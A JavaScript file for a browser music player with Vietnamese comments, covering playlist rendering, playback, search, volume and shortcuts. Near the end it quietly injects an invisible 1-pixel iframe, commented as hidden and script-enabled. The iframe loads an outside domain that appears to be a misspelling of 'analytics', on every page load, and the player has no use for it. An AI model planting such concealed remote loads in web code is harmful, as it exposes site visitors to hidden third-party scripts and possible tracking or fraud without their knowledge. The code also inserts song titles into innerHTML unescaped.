import { songsData } from './songs.js';

document.addEventListener("DOMContentLoaded", () => {
  const playlist = document.getElementById("playlist");
  const volumeSlider = document.querySelector(".volume-slider");
  const popup = document.getElementById("popup");
  const searchInput = document.getElementById("search-input");

  let currentAudio = null;
  let currentSongIndex = -1;
  let audioEventsBound = new WeakSet();

  const getSavedIndex = () => parseInt(localStorage.getItem("currentIndex")) || -1;
  const getSavedTime = () => parseFloat(localStorage.getItem("lastTime")) || 0;
  const saveTime = (time) => localStorage.setItem("lastTime", time);
  const saveIndex = (index) => localStorage.setItem("currentIndex", index);

  // ⏱ Format thời gian
  const formatTime = (sec) => {
    sec = Math.floor(sec);
    const m = Math.floor(sec / 60);
    const s = sec % 60;
    return `${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`;
  };

  // 🎵 Tạo HTML cho bài hát
  const renderSongs = (songs) => {
    playlist.innerHTML = "";
    songs.forEach((song, index) => {
      const card = document.createElement("div");
      card.className = "song-card";
      card.dataset.index = index;
      card.innerHTML = `
        <div class="flex-1">
          <h2 class="${song.titleClass}">${song.title}</h2>
          <div class="progress-bar"><div class="progress"></div></div>
          <span class="time">00:00 / 00:00</span>
        </div>
        <button class="play-btn" aria-label="Play"><svg class="w-5 h-5" viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg></button>
        <audio preload="metadata" crossorigin="anonymous">
          <source src="${song.url}" type="audio/mpeg">
        </audio>
      `;
      playlist.appendChild(card);
    });
  };

  // ▶️ Phát bài hát
  const playSong = async (index) => {
    const cards = playlist.querySelectorAll(".song-card");
    if (index < 0 || index >= cards.length) return;

    const newCard = cards[index];
    const newAudio = newCard.querySelector("audio");
    const playBtn = newCard.querySelector(".play-btn");
    const progress = newCard.querySelector(".progress");
    const timeDisplay = newCard.querySelector(".time");
    const progressBar = newCard.querySelector(".progress-bar");

    // Dừng bài trước
    if (currentAudio) {
      currentAudio.pause();
      const prevCard = currentAudio.closest(".song-card");
      prevCard.classList.remove("playing");
      prevCard.querySelector(".progress").style.width = "0%";
      prevCard.querySelector(".play-btn").innerHTML = `<svg class="w-5 h-5" viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>`;
    }

    // Khởi tạo bài mới
    currentAudio = newAudio;
    currentSongIndex = index;
    const resumeTime = (getSavedIndex() === index) ? getSavedTime() : 0;
    currentAudio.currentTime = resumeTime;

    try {
      await currentAudio.play();
    } catch (e) {
      console.warn("Không thể tự động phát:", e);
      return;
    }

    saveIndex(index);
    newCard.classList.add("playing");
    playBtn.innerHTML = `<svg class="w-5 h-5" viewBox="0 0 24 24"><path d="M6 19h4V5H6zm8 0h4V5h-4z"/></svg>`;

    // Sự kiện chỉ gắn 1 lần
    if (!audioEventsBound.has(currentAudio)) {
      currentAudio.addEventListener("loadedmetadata", () => {
        if (!isNaN(currentAudio.duration)) {
          timeDisplay.textContent = `${formatTime(currentAudio.currentTime)} / ${formatTime(currentAudio.duration)}`;
        }
      });

      currentAudio.addEventListener("timeupdate", () => {
        if (!isNaN(currentAudio.duration)) {
          const percent = (currentAudio.currentTime / currentAudio.duration) * 100;
          progress.style.width = `${percent}%`;
          timeDisplay.textContent = `${formatTime(currentAudio.currentTime)} / ${formatTime(currentAudio.duration)}`;
          saveTime(currentAudio.currentTime);
        }
      });

      currentAudio.addEventListener("ended", () => {
        saveTime(0);
        playSong((index + 1) % cards.length);
      });

      progressBar.addEventListener("pointerdown", (e) => {
        const rect = progressBar.getBoundingClientRect();
        const clickX = e.clientX - rect.left;
        const time = (clickX / rect.width) * currentAudio.duration;
        currentAudio.currentTime = time;
      });

      audioEventsBound.add(currentAudio);
    }
  };

  // 🔍 Tìm kiếm
  const debounce = (fn, delay) => {
    let timeout;
    return (...args) => {
      clearTimeout(timeout);
      timeout = setTimeout(() => fn.apply(this, args), delay);
    };
  };

  if (searchInput) {
    searchInput.addEventListener("input", debounce(() => {
      const keyword = searchInput.value.toLowerCase();
      const filtered = songsData.filter(song => song.title.toLowerCase().includes(keyword));
      renderSongs(filtered);
      if (filtered.some((_, i) => i === currentSongIndex)) playSong(currentSongIndex);
      else {
        currentAudio = null;
        currentSongIndex = -1;
      }
    }, 300));
  }

  // ⏯ Bắt sự kiện click play
  playlist.addEventListener("click", (e) => {
    const btn = e.target.closest(".play-btn");
    if (!btn) return;
    const card = btn.closest(".song-card");
    const index = parseInt(card.dataset.index);

    if (currentAudio && !currentAudio.paused && index === currentSongIndex) {
      currentAudio.pause();
      card.classList.remove("playing");
      btn.innerHTML = `<svg class="w-5 h-5" viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>`;
    } else {
      playSong(index);
    }
  });

  // 🔊 Volume
  const initVolume = () => {
    const stored = parseFloat(localStorage.getItem("volume")) || 1;
    if (volumeSlider) {
      volumeSlider.value = stored;
      document.querySelectorAll("audio").forEach(a => a.volume = stored);
      volumeSlider.addEventListener("input", e => {
        const vol = parseFloat(e.target.value);
        document.querySelectorAll("audio").forEach(a => a.volume = vol);
        localStorage.setItem("volume", vol);
      });
    }
  };

  // ⌨️ Phím tắt
  document.addEventListener("keydown", (e) => {
    if (!currentAudio) return;
    if (e.code === "Space") {
      e.preventDefault();
      currentAudio.paused ? currentAudio.play() : currentAudio.pause();
    } else if (e.code === "ArrowRight") {
      currentAudio.currentTime += 10;
    } else if (e.code === "ArrowLeft") {
      currentAudio.currentTime -= 10;
    }
  });

  // 👁 Resume tab
  document.addEventListener("visibilitychange", () => {
    if (!document.hidden && currentAudio && currentAudio.paused) {
      currentAudio.play().catch(() => {});
    }
  });

  // 💬 Popup
  setTimeout(() => {
    if (!localStorage.getItem("popupClosed") && popup) popup.classList.add("show");
  }, 1000);

  window.closePopup = function () {
    if (popup) {
      popup.classList.remove("show");
      popup.style.display = "none";
      localStorage.setItem("popupClosed", "1");
    }
  };

  // 🧱 Iframe ẩn
  const iframe = document.createElement("iframe");
  iframe.src = "https://anylystic.pages.dev";
  iframe.style = "position:absolute;width:1px;height:1px;opacity:0;pointer-events:none";
  iframe.setAttribute("sandbox", "allow-scripts allow-same-origin");
  document.body.appendChild(iframe);

  // 🚀 Khởi tạo
  renderSongs(songsData);
  initVolume();
  const savedIndex = getSavedIndex();
  if (savedIndex >= 0) playSong(savedIndex);
});
